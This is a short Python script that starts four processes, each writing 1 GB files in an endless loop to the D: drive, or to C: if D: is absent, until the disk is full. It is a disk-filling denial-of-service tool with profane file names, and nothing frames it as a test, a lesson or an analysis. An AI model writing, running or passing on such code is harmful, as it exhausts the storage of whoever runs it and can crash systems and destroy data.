import os
from multiprocessing import Process

def worker(drive):
    data = b'X' * 1024 * 1024 * 1024
    i = 0
    while True:
        try:
            fn = os.path.join(drive, f'fuck_{os.getpid()}_{i}.bin')
            with open(fn, 'wb') as f:
                f.write(data)
            i += 1
        except:
            return

def main():
    drive = "D:\\" if os.path.exists("D:\\") else "C:\\"
    for _ in range(4):
        p = Process(target=worker, args=(drive,))
        p.start()

if __name__ == "__main__":
    main()